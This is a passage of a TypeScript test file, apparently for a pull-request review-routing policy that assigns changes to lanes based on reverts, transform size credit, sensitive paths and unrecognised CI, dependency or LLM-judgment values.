        Array.from({ length: 50 }, (_, i) => file(`src/f${i}.ts`, 0, 30)),
      ),
    computedLane: 0,
    lane: 0,
    includes: ["revert.auto-merge"],
    excludes: ["size.lines-over-lane1", "size.files-over-lane1"],
  },
  {
    name: "any other raised reason disables the exception (coverage below threshold)",
    input: () => replaceKind(verifiedRevert(), "coverage", coverage(0.5)),
    computedLane: 1,
    includes: ["plan.missing", "coverage.below-threshold", "revert.verified"],
    excludes: ["revert.auto-merge", "revert.waived"],
  },
  {
    name: "a verified revert touching a sensitive path is still Lane 2",
    input: () => addFiles(verifiedRevert(), file("src/auth/x.ts", 0, 3)),
    computedLane: 2,
    includes: ["sensitive.hit"],
    excludes: ["revert.auto-merge"],
  },
  {
    name: "autoMergeVerifiedReverts=false → normal rules (plan.missing)",
    input: () => mutate(verifiedRevert(), (d) => (d.policy.autoMergeVerifiedReverts = false)),
    computedLane: 1,
    includes: ["plan.missing"],
    excludes: ["revert.auto-merge"],
  },
  {
    name: "autoMergeVerifiedReverts=false with an approved plan → shadowed",
    input: () =>
      mutate(verifiedRevert(), (d) => {
        d.policy.autoMergeVerifiedReverts = false;
        d.plan = plan();
      }),
    computedLane: 0,
    shadow: true,
  },
]);

table("transform size subtraction", [
  {
    name: "verified transform files don't count toward size",
    input: () =>
      withItems(
        withFiles(green(), [
          ...RENAMED.map((p) => file(p, 200, 200)),
          file("src/slugify.ts", 6, 2),
        ]),
        transform(RENAMED),
      ),
    computedLane: 0,
    includes: ["size.transform-excluded", "size.ok"],
    check: (r) => {
      expect(reasonFor(r, "size.transform-excluded")?.message).toContain(
        "1200 line(s) in 3 file(s)",
      );
      expect(reasonFor(r, "size.ok")?.message).toContain("8 changed line(s) in 1 file(s)");
    },
  },
  {
    name: "unverified transform gives no size credit",
    input: () =>
      withItems(
        withFiles(
          green(),
          RENAMED.map((p) => file(p, 200, 200)),
        ),
        transform(RENAMED, { verified: false }),
      ),
    computedLane: 2,
    includes: ["size.lines-over-lane1"],
    excludes: ["size.transform-excluded"],
  },
  {
    name: "a renamed file is only covered if its source path is reproduced too",
    input: () =>
      withItems(
        withFiles(green(), [
          file("src/users/a.ts", 400, 400, {
            status: "renamed",
            previousPath: "src/users/old-a.ts",
          }),
        ]),
        transform(["src/users/a.ts"]),
      ),
    computedLane: 1,
    includes: ["size.lines-over-lane0"],
  },
  {
    name: "claimed transform fully verified → Lane 0",
    input: verifiedTransform,
    computedLane: 0,
    includes: ["transform.verified"],
    excludes: ["transform.unverified"],
  },
]);

describe("context and claim edge cases", () => {
  it("a claim alone never lowers: claimed 'docs' with a breaking API is Lane 2", () => {
    const r = run(
      mutate(
        replaceKind(green(), "public-api", publicApi("breaking")),
        (d) => (d.change.category = "docs"),
      ),
    );
    expect(r.computedLane).toBe(2);
  });

  it.each(["weird", "constructor", "toString"])(
    "an unrecognised CI status at runtime (%s) is treated as unknown",
    (status) => {
      const input = green();
      const r = run({
        ...input,
        context: { ...greenContext(), ciStatus: status as unknown as "passed" },
      });
      expect(r.computedLane).toBe(2);
      expect(r.reasons.map((x) => x.code)).toContain("ci.unknown");
    },
  );

  it("an unrecognised bump kind at runtime is treated as 'other' (Lane 2)", () => {
    const weird = { ...bump("zod", "patch"), bump: "constructor" as unknown as "patch" };
    const input = mutate(green(), (d) => {
      d.evidence = {
        items: [...(d.evidence?.items ?? []).filter((i) => i.kind !== "dependencies")],
      };
    });
    const r = run({
      ...input,
      evidence: {
        items: [...(input.evidence?.items ?? []), { ...dependencies(), changed: [weird] }],
      },
    });
    expect(r.computedLane).toBe(2);
    expect(r.reasons.map((x) => x.code)).toContain("dependency.other-bump");
  });

  it("an unrecognised LLM outcome at runtime is treated as a concern (Lane 2)", () => {
    const judgment = { ...llm("unsure"), outcome: "maybe" as unknown as "unsure" };
    const input = green();
    const r = run({ ...input, evidence: { items: [...(input.evidence?.items ?? []), judgment] } });
    expect(r.computedLane).toBe(2);
    expect(r.reasons.map((x) => x.code)).toContain("llm.concern");
  });

  it.each(["added", "deleted"] as const)(
    "a %s lockfile is not part of a dependency-patch",
    (status) => {
      const input = mutate(dependencyPatch(), (d) => {
        const lock = d.diffStats?.files.find((f) => f.path === "pnpm-lock.yaml");
        if (lock) lock.status = status;
      });
      const r = run(input);
      expect(r.computedLane).toBe(1);
      expect(r.reasons.map((x) => x.code)).toContain("plan.missing");
    },
  );

  it("an empty diff with all evidence ok is Lane 0", () => {
    const r = run(mutate(green(), (d) => (d.diffStats = diff([]))));
    expect(r.computedLane).toBe(0);
  });
});
